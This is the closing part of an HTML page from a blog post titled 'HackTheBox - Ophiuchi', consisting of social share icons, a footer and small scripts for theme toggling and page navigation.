148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Ophiuchi on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20Ophiuchi&url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-ophiuchi%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
</a>
</div>
</footer>
</article>
</main>
<footer class=footer>
<span>&copy; 2021 <a href=https://fahmifj.github.io/>友人F</a></span>
<span>&#183;</span>
<span>
Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
</span>
</footer>
<script>var toc=document.getElementsByClassName('inner')[0],pTag=document.getElementsByClassName('post-meta')[0],fromTop=pTag.getBoundingClientRect().top,fromBottom=pTag.getBoundingClientRect().bottom;document.addEventListener('scroll',function(b){let a=document.documentElement.scrollTop+75;a>fromTop?(toc.style.visibility='visible',toc.style.opacity='1'):(toc.style.visibility='hidden',toc.style.opacity='0')})</script>
<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
</body>
</html>